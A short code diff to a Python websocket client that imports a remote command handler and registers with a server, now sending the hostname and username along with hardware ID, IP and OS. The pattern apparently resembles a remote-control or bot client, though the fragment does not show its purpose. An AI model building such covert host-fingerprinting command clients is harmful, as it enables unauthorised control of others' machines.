@@ -1,7 +1,7 @@
 import socketio
 from auth import get_user_id
 from command_handler import run_command
-from utils.system_info import get_hwid, get_ip, get_os
+from utils.system_info import get_hostname, get_hwid, get_ip, get_os, get_username
 from config import WEBSOCKET_URL 
 import sys
 import os
@@ -50,6 +50,8 @@ def register_client():
         'hwid': get_hwid(),
         'ip': get_ip(),
         'os': get_os(),
+        'hostname': get_hostname(),
+        'username': get_username(),
         'userId': user_id
     }
     sio.emit("register", client_info)
